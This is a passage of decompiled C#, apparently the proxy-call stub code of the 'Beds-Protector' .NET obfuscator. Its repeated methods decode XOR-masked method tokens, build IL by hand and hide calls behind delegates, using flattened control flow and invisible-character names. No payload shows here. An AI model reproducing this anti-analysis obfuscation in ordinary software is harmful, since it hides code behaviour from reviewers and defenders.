    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 14472 - 3860 - 10612;
    FieldInfo fieldFromHandle;
    Type[] parameterTypes;
    MethodInfo methodInfo;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      byte[] numArray;
      int num2;
      if (num1 == 38706 - 10131 - 28572)
      {
        num2 = numArray.Length;
        num1 = 6784 - 56968 + 50188;
      }
      int metadataToken;
      if (num1 == 16941 + 27923 - 44860)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 0;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 50526 - 147210 + 96689;
      }
      if (num1 == 64018 - 76881 + 12864)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 84845 - 109295 + 24452;
      }
      if (num1 == 7511 + 53272 - 60778)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 95775 - 177563 + 81794;
      }
      if (num1 != 81095 - 125116 + 44045)
        goto label_12;
label_10:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 36261 - 36766 + 530;
      else
        goto label_50;
label_12:
      ParameterInfo[] parameters;
      if (num1 == 59537 - 57186 - 2332)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 543 - 63301 + 62778;
      }
      if (num1 != 75690 - 62681 - 12993)
        goto label_16;
label_15:
      MethodInfo[] methods;
      int index2;
      methodInfo = methods[index2];
      num1 = 75939 - 161800 + 85878;
label_16:
      if (num1 == 26438 - 9659 - 16766)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 14284 - 42882 + 28612;
      }
      if (num1 == 26597 + 19872 - 46451)
      {
        parameters = methodInfo.GetParameters();
        num1 = 92013 - 119807 + 27813;
      }
      if (num1 == 49834 - 19585 - 30235)
      {
        index2 = 0;
        num1 = 39215 + 46778 - 85978;
      }
      if (num1 == 6143 - 76707 + 70571)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 44329 - 97709 + 53388;
      }
      if (num1 == 94356 - 188802 + 94458)
      {
        parameterTypes = (Type[]) null;
        num1 = 14157 + 50086 - 64230;
      }
      if (num1 == 11459 - 77866 + 66432)
      {
        declaringType = method.DeclaringType;
        num1 = 74899 - 144466 + 69593;
      }
      if (num1 == 65028 - 82303 + 17281)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 21945 + 15433 - 37371;
      }
      if (num1 == 54079 - 114557 + 60488)
        return;
      if (num1 != 52222 + 32542 - 84743)
      {
        if (num1 != 15307 - 33120 + 17824)
          goto label_34;
label_33:
        dynamicMethod = (DynamicMethod) null;
        num1 = 27242 + 63377 - 90607;
label_34:
        if (num1 == 34154 - 44664 + 10527)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 82221 - 166070 + 83867;
          }
          else
          {
            ++index2;
            goto label_57;
          }
        }
        if (num1 == 61380 - 134965 + 73593)
        {
          if (method.IsStatic)
            num1 = 60642 - 119509 + 58876;
          else
            goto label_33;
        }
        if (num1 == 68696 - 143966 + 75272)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 33200 - 56662 + 23465;
        }
        if (num1 == 92899 - 80124 - 12766)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 26097 + 54156 - 80243;
        }
        if (num1 != 79486 - 87008 + 7537)
        {
          if (num1 == 51769 - 4863 - 46883)
          {
            ++index1;
            num1 = 26673 - 73251 + 46602;
          }
          if (num1 == 26843 - 113792 + 86969)
          {
            index1 = 0;
            num1 = 76621 - 826 - 75774;
          }
          if (num1 != 66707 - 113847 + 47162)
            goto label_51;
          else
            goto label_50;
        }
label_57:
        if (index2 < methods.Length)
          goto label_15;
        else
          goto label_58;
      }
      else
        goto label_10;
label_50:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 25867 - 104930 + 79086;
label_51:
      if (num1 == 85795 - 177653 + 91858)
        num1 = 94359 - 94448 + 90;
    }
    while (num1 != 77841 - 130057 + 52242);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 65825 + 30284 - 96109;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      if (num1 == 76330 - 91664 + 15341)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 86364 - 6258 - 80098;
      }
      byte[] numArray;
      if (num1 == 11992 - 2560 - 9430)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 28669 - 10274 - 18392;
      }
      if (num1 == 36495 - 29787 - 6698)
        return;
      int num2;
      if (num1 != 33080 - 59191 + 26126)
      {
        ParameterInfo[] parameters;
        if (num1 == 95371 - 126526 + 31173)
        {
          parameters = methodInfo.GetParameters();
          num1 = 46793 - 45492 - 1282;
        }
        int index;
        if (num1 == 94360 - 163459 + 69122)
        {
          ++index;
          num1 = 90859 - 33713 - 57122;
        }
        if (num1 != 60432 - 123438 + 63027)
        {
          if (num1 == 69656 - 145386 + 75750)
          {
            index = 0;
            num1 = 73465 - 127643 + 54199;
          }
          if (num1 != 93391 - 819 - 92548)
            goto label_17;
        }
        if (index >= parameterTypes.Length)
          num1 = 6599 - 55690 + 49116;
        else
          goto label_24;
label_17:
        if (num1 == 69983 - 33516 - 36448)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 37855 - 89298 + 51463;
        }
        if (num1 == 48925 - 142104 + 93191)
        {
          parameterTypes = (Type[]) null;
          num1 = 1662 + 8148 - 9797;
        }
        if (num1 == 49270 - 33281 - 15986)
        {
          num2 = numArray.Length;
          num1 = 49576 - 56677 + 7105;
        }
        if (num1 != 82615 - 122337 + 39744)
          goto label_25;
label_24:
        parameterTypes[index] = parameters[index].ParameterType;
        num1 = 9830 - 72249 + 62442;
label_25:
        if (num1 == 97820 + 1735 - 99546)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 76974 - 84945 + 7981;
        }
        if (num1 != 8733 - 108071 + 99354)
          goto label_29;
      }
      else
        goto label_57;
label_28:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 32423 + 20005 - 52411;
label_29:
      int metadataToken;
      if (num1 == 68682 + 20673 - 89350)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 37118 + 11563 - 48675;
      }
      if (num1 == 23103 - 45911 + 22816)
      {
        if (method.IsStatic)
          num1 = 65952 - 53716 - 12227;
        else
          goto label_42;
      }
      if (num1 == 26104 + 38212 - 64291)
      {
        declaringType = method.DeclaringType;
        num1 = 85443 - 54230 - 31187;
      }
      if (num1 == 9372 - 98440 + 89085)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 74005 - 4900 - 69087;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 51916 - 63700 + 11797)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 85209 - 131744 + 46549;
      }
      if (num1 != 14328 + 10442 - 24759)
        goto label_43;
label_42:
      dynamicMethod = (DynamicMethod) null;
      num1 = 63575 - 9582 - 53981;
label_43:
      if (num1 == 17754 - 65627 + 47877)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 24) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 8);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 0;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoglBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoglBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 91068 - 188348 + 97285;
      }
      if (num1 == 58090 + 39626 - 97710)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 87318 - 77725 - 9586;
      }
      if (num1 == 20087 + 43690 - 63776)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 68167 - 7442 - 60723;
      }
      if (num1 == 23146 + 63325 - 86457)
      {
        index1 = 0;
        num1 = 20263 - 66435 + 46187;
      }
      if (num1 == 25215 + 36878 - 62093)
        num1 = 76267 - 171196 + 94930;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_28;
      else
        goto label_58;
    }
    while (num1 != 87468 - 102354 + 14912);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index2 = method.IsConstructor ? 0 : -1;
    for (int index3 = 0; index3 < parameterTypes.Length; ++index3)
    {
      byte[] numArray1 = code;
      int index4 = num9;
      int num10 = index4 + 1;
      numArray1[index4] = (byte) 14;
      byte[] numArray2 = code;
      int index5 = num10;
      int num11 = index5 + 1;
      int num12 = (int) (byte) index3;
      numArray2[index5] = (byte) num12;
      Type type = index2 == -1 ? method.DeclaringType : parameters1[index2].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index6 = num11;
        int num13 = index6 + 1;
        numArray3[index6] = (byte) 116;
        byte[] numArray4 = code;
        int index7 = num13;
        int num14 = index7 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index7] = (byte) num15;
        byte[] numArray5 = code;
        int index8 = num14;
        int num16 = index8 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index8] = (byte) num17;
        byte[] numArray6 = code;
        int index9 = num16;
        int num18 = index9 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index9] = (byte) num19;
        byte[] numArray7 = code;
        int index10 = num18;
        num9 = index10 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index10] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index2;
    }
    byte[] numArray8 = code;
    int index11 = num9;
    int num21 = index11 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index11] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index12 = num21;
    int num23 = index12 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index12] = (byte) num24;
    byte[] numArray10 = code;
    int index13 = num23;
    int num25 = index13 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index13] = (byte) num26;
    byte[] numArray11 = code;
    int index14 = num25;
    int num27 = index14 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index14] = (byte) num28;
    byte[] numArray12 = code;
    int index15 = num27;
    int index16 = index15 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index15] = (byte) num29;
    code[index16] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoglBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoglBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogLBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogLBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 10309 - 63240 + 52931;
    MethodBase method;
    Type declaringType;
    FieldInfo fieldFromHandle;
    Type[] parameterTypes;
    MethodInfo methodInfo;
    Type fieldType;
    DynamicMethod dynamicMethod;
    do
    {
      if (num1 == 83310 - 9860 - 73425)
      {
        declaringType = method.DeclaringType;
        num1 = 91799 - 91437 - 336;
      }
      int index1;
      if (num1 == 71376 - 104542 + 33189)
      {
        ++index1;
        num1 = 73938 + 2210 - 76124;
      }
      MethodInfo[] methods;
      if (num1 == 82772 - 64129 - 18630)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 18212 + 64036 - 82234;
      }
      int metadataToken;
      if (num1 == 67524 - 78923 + 11405)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 1689 - 50514 + 48832;
      }
      int index2;
      ParameterInfo[] parameters;
      byte[] numArray;
      if (num1 != 35191 - 115450 + 80274)
      {
        if (num1 == 94674 - 39060 - 55600)
        {
          index2 = 0;
          num1 = 10845 - 103160 + 92330;
        }
        if (num1 == 87297 - 99567 + 12289)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 8948 + 86120 - 95048;
        }
        if (num1 == 83389 + 12998 - 96375)
        {
          parameterTypes = (Type[]) null;
          num1 = 85969 - 99189 + 13233;
        }
        if (num1 == 76300 - 1896 - 74387)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 37537 + 32678 - 70197;
          }
          else
          {
            ++index2;
            goto label_57;
          }
        }
        if (num1 == 41526 - 105637 + 64113)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 24593 - 95609 + 71019;
        }
        if (num1 != 20062 - 84794 + 64748)
          goto label_23;
      }
      else
        goto label_57;
label_22:
      methodInfo = methods[index2];
      num1 = 69064 - 60910 - 8137;
label_23:
      int num2;
      if (num1 != 20523 - 77920 + 57418)
      {
        if (num1 == 69945 - 118531 + 48604)
        {
          parameters = methodInfo.GetParameters();
          num1 = 16356 - 35858 + 19521;
        }
        if (num1 == 17411 + 52457 - 69864)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num5 = num4 - 1]) << 0);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[2] ^ (int) numArray[num2 = num7 - 1]) << 8;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogmBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogmBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 9383 + 67040 - 76418;
        }
        if (num1 != 89737 - 180308 + 90595)
          goto label_31;
      }
      if (index1 >= parameterTypes.Length)
        num1 = 85403 - 88614 + 3236;
      else
        goto label_38;
label_31:
      if (num1 == 28216 - 43125 + 14917)
      {
        if (method.IsStatic)
          num1 = 41269 - 121549 + 80289;
        else
          goto label_40;
      }
      if (num1 == 30299 - 3157 - 27132)
        return;
      if (num1 == 55814 - 9121 - 46692)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 45663 - 107042 + 61381;
      }
      if (num1 != 71359 + 21592 - 92929)
        goto label_39;
label_38:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 44591 - 51953 + 7385;
label_39:
      if (num1 != 1155 - 43261 + 42117)
        goto label_41;
label_40:
      dynamicMethod = (DynamicMethod) null;
      num1 = 88330 - 133857 + 45539;
label_41:
      if (num1 == 17542 - 14930 - 2607)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 54182 - 68211 + 14035;
      }
      if (num1 == 1543 + 13805 - 15345)
      {
        num2 = numArray.Length;
        num1 = 68315 - 113067 + 44756;
      }
      if (num1 == 92389 - 176157 + 83777)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 28193 + 48296 - 76479;
      }
      if (num1 == 69545 + 29725 - 99263)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 29214 - 73354 + 44148;
      }
      if (num1 == 10306 - 100854 + 90568)
      {
        index1 = 0;
        num1 = 5525 + 7532 - 13036;
      }
      if (num1 == 26436 + 38171 - 64607)
        num1 = 81592 - 111916 + 30325;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_22;
      else
        goto label_58;
    }
    while (num1 != 32982 + 18960 - 51916);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
